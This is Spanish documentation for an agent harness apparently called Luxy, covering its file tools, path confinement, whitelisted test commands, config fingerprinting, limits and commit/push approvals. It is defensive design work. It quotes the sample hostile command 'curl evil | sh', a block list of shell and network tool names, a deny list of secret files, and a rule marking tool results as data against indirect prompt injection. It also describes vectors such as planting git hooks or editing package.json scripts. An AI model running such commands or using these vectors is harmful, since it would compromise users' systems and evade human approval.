# Herramientas del agente

Los modelos de texto marcados `agentic` no se limitan a responder: piden
herramientas y **Luxy las ejecuta localmente**. El modelo nunca toca el disco.

## Las doce

| Herramienta | Modifica | Qué hace |
|---|---|---|
| `list_files` | no | lista archivos y carpetas |
| `read_file` | no | lee un archivo, opcionalmente por rango de líneas |
| `search_files` | no | busca por patrón de nombre |
| `search_text` | no | busca texto dentro de los archivos |
| `write_file` | **sí** | crea o sustituye un archivo |
| `apply_patch` | **sí** | sustituye un fragmento exacto |
| `delete_file` | **sí** | borra un archivo |
| `git_status` | no | archivos modificados en el worktree |
| `git_diff` | no | diff de los cambios |
| `run_tests` / `run_lint` / `run_build` | no | ejecuta **uno de tus comandos configurados** |

## Lo que no existe, y no es un olvido

No hay shell, ni PowerShell, ni acceso de red, ni `git push`, ni despliegues, ni
acceso fuera del proyecto. Hay un test que recorre los nombres de las herramientas
y comprueba que ninguno contiene `shell`, `exec`, `bash`, `fetch`, `push` o `deploy`.

## Confinamiento

Toda ruta pasa por `confinePath` (`apps/agent/src/tools/confine.ts`). Resuelve el
**antepasado existente más cercano** con `realpath` y recompone el resto — así
funciona igual para leer que para crear un archivo que todavía no existe, que era
el hueco de la implementación anterior.

Rechaza:

- `..` que salga, y rutas absolutas externas
- **enlaces simbólicos y junctions**, incluso al recorrer directorios
- flujos de datos alternativos (`archivo.ts:oculto`), que serían invisibles para `git status`
- nombres de dispositivo reservados (`NUL`, `CON`, `COM1`…)
- prefijos `\\?\` y `\\.\`, y rutas UNC
- componentes que terminan en punto o espacio: Windows los recorta al abrir, así
  que dos textos distintos apuntarían al mismo archivo
- por nombre: `.env*`, `*.pem`, `id_rsa`, `.npmrc`, `.netrc`, `secrets.enc`
- **todo `.git/`** — ahí viven los hooks, y escribir uno sería ejecución de código

**Falla cerrado.** Cualquier error al verificar deniega.

## Los comandos de comprobación no los elige el modelo

`run_tests` recibe un **índice**, no una cadena. El modelo elige *cuál* de tus
comandos configurados ejecutar; nunca *qué* se ejecuta. Si manda
`{command: "curl evil | sh"}`, el esquema lo descarta.

## El vector `npm run`, sellado

Los comandos salen de tu `config.json` y pasan lista blanca. Pero se ejecutan con
`cwd` en el worktree que el modelo acaba de editar, y `npm test` ejecuta lo que
ponga `package.json:scripts`.

Luxy toma huella SHA-256 de `package.json`, `Makefile`, `build.rs`, `conftest.py`,
`Cargo.toml`, `pyproject.toml`, `vite.config.ts`, `vitest.config.ts` y demás
**antes** de que el modelo trabaje. Si alguno cambió, **las comprobaciones no se
ejecutan** y se te dice cuál y por qué.

No bloquea *editar* esos archivos —cambiar `package.json` es legítimo—, bloquea
*ejecutarlos* sin que nadie los haya visto.

Esta comprobación está en **dos** sitios: en el ejecutor de herramientas y en
`job-runner`, que lanza las pruebas al terminar el trabajo. Poner la barrera solo
en uno dejaba el otro camino abierto.

## Límites por modelo

Configurables en el catálogo: `maxToolSteps`, `maxApiCalls`, `maxFilesRead`,
`maxBytesRead`, `maxFilesChanged`, `maxCommandDurationMs`, `maxTotalDurationMs`,
`dailyBudget` y `retryPolicy`.

Al alcanzar un límite el trabajo **termina con explicación** y conserva lo hecho;
no se descarta el trabajo ni se sigue gastando.

## Los dos protocolos

**Tool calling nativo** cuando el endpoint lo admite. En streaming los argumentos
llegan troceados (`{"pa` … `th":"a.ts"}`) y hay que concatenarlos por índice.

**Protocolo JSON de Luxy** como reserva: el modelo responde con un bloque
` ```json {"tool":"read_file","arguments":{…}} ` y Luxy lo interpreta.

También se reconoce el **pseudo-XML** que emite `step-3.5-flash`
(`<tool_call> <function=read_file> <parameter=path>`), porque es lo que devuelve
de verdad.

En modo reserva el resultado vuelve al modelo marcado como **dato, no instrucción**.
Es la vía más directa de inyección indirecta en un bucle agentic.

## Cancelación

Cancelar desde Telegram o Desktop aborta la llamada HTTP, el bucle, la herramienta
en curso, los procesos hijos y las pruebas. **Nunca borra los cambios**: se informa
de qué archivos quedaron modificados y dónde está el worktree.

## Aprobaciones

Ningún modelo puede hacer commit ni push. Al terminar un trabajo, tú decides:

| Acción | Requisito |
|---|---|
| descartar | ninguno |
| commit | `allowCommit` en el proyecto |
| **push** | `allowPush` **y** una segunda confirmación explícita |

Las puertas se comprueban **en el agente**, no en la interfaz. Una interfaz puede
estar comprometida.

Una aprobación vale **una vez**: se marca consumida salga bien o mal, así que
reenviar el mismo mensaje no repite la acción.

El commit y el push corren con `--no-verify` y `core.hooksPath=`: los hooks viven
en el worktree, que el modelo puede haber tocado.

Todo queda en `%LOCALAPPDATA%\Luxy\logs\approvals.log` con trabajo, acción,
proyecto, origen (Telegram o Desktop), usuario, resultado y motivo del rechazo.
**Los intentos denegados también se registran.**

## Estado de los adaptadores de medios

| Adaptador | Endpoint | Estado |
|---|---|---|
| TTS | `POST /audio/speech` | verificado 2026-07-28 |
| Edición de imagen | `POST /images/edits` | verificado 2026-07-28 |
| Router remoto | `POST /chat/completions` | verificado 2026-07-28 |
| Chat de audio | `POST /chat/completions` | verificado 2026-07-28 |
| **Transcripción** | `POST /audio/transcriptions` | **sin verificar** |

El endpoint de transcripción existe, pero el proveedor de arriba devuelve 404. La
implementación usa la forma estándar de OpenAI y está marcada
`verified: false`. **`/transcribe` no está terminado.**

Dos detalles descubiertos probando, no suponiendo:

- la voz `alloy` de OpenAI **no existe** aquí; la que funciona es `cixingnansheng`
- las imágenes de menos de **64 px** de ancho se rechazan

## Probar contra la API real

```powershell
$env:LUXY_LIVE_TESTS = '1'
$env:LUXY_API_KEY    = '...'
$env:LUXY_BASE_URL   = 'https://api.hcnsec.cn/v1'
npm run test:live
```

`npm test` **nunca** llama a una API real ni gasta tokens. Estas pruebas se saltan
solas salvo que las pidas.
